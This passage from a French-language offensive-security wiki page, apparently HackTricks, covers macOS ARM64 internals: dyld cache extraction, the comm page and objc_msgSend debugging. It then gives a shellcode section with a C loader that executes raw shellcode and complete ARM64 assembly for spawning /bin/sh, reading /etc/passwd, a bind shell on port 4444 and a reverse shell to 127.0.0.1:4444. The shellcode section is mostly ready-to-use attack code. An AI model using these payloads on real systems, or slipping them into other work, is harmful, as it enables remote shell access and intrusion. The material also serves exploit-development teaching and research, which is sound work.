dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Notez qu'**Ida** et **Ghidra** peuvent également décompiler des **dylibs spécifiques** depuis le cache, simplement en fournissant le cache.

> [!TIP]
> Il est parfois plus facile de vérifier le code **décompilé** de **`libsystem_kernel.dylib`** plutôt que de consulter le **code source**, car le code de plusieurs syscalls (BSD et Mach) est généré via des scripts (consultez les commentaires dans le code source), tandis que la dylib permet de voir ce qui est appelé.

### appels machdep

XNU prend également en charge un autre type d'appels, appelés appels dépendants de la machine. Les numéros de ces appels dépendent de l'architecture, et ni les appels ni leurs numéros ne sont garantis de rester constants.

### comm page

Il s'agit d'une page mémoire appartenant au kernel, mappée dans l'espace d'adressage de chaque processus utilisateur. Elle vise à rendre la transition du mode utilisateur vers l'espace kernel plus rapide que l'utilisation de syscalls pour les services du kernel utilisés si fréquemment que cette transition serait très inefficace.

Par exemple, l'appel `gettimeofdate` lit directement la valeur de `timeval` depuis la comm page.

### objc_msgSend

Il est très courant de trouver cette fonction utilisée dans les programmes Objective-C ou Swift. Cette fonction permet d'appeler une méthode d'un objet Objective-C.

Paramètres ([plus d'informations dans la documentation](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointeur vers l'instance
- x1: op -> Selector de la méthode
- x2... -> Reste des arguments de la méthode invoquée

Ainsi, si vous placez un breakpoint avant le branchement vers cette fonction, vous pouvez facilement trouver ce qui est invoqué dans lldb (dans cet exemple, l'objet appelle un objet de `NSConcreteTask` qui exécutera une commande):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> En définissant la variable d'environnement **`NSObjCMessageLoggingEnabled=1`**, il est possible de journaliser les appels à cette fonction dans un fichier tel que `/tmp/msgSends-pid`.
>
> De plus, en définissant **`OBJC_HELP=1`** et en appelant n'importe quel binaire, vous pouvez voir d'autres variables d'environnement que vous pourriez utiliser pour **journaliser** les occurrences de certaines actions Objc-C.

Lorsque cette fonction est appelée, il est nécessaire de trouver la méthode appelée de l'instance indiquée. Pour cela, plusieurs recherches sont effectuées :

- Effectuer une recherche optimiste dans le cache :
- Si elle réussit, terminer
- Acquérir runtimeLock (lecture)
- Si (realize && !cls->realized), réaliser la classe
- Si (initialize && !cls->initialized), initialiser la classe
- Essayer le cache propre à la classe :
- Si elle réussit, terminer
- Essayer la liste des méthodes de la classe :
- Si la méthode est trouvée, remplir le cache et terminer
- Essayer le cache de la superclasse :
- Si elle réussit, terminer
- Essayer la liste des méthodes de la superclasse :
- Si la méthode est trouvée, remplir le cache et terminer
- Si (resolver), essayer le method resolver et répéter à partir de la recherche dans la classe
- Si l'exécution est toujours ici (= toutes les autres tentatives ont échoué), essayer le forwarder

### Shellcodes

Pour compiler :
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Pour les versions plus récentes de macOS :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tiré de [**ici**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) et expliqué.<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lire avec cat

L'objectif est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, le deuxième argument (x1) est donc un tableau de paramètres (qui, en mémoire, correspondent à une pile d'adresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Exécuter une commande avec sh depuis un fork afin que le processus principal ne soit pas tué
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell depuis [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) sur le **port 4444**<sup>[2]</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

À partir de [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell vers **127.0.0.1:4444**<sup>[3]</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Références

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
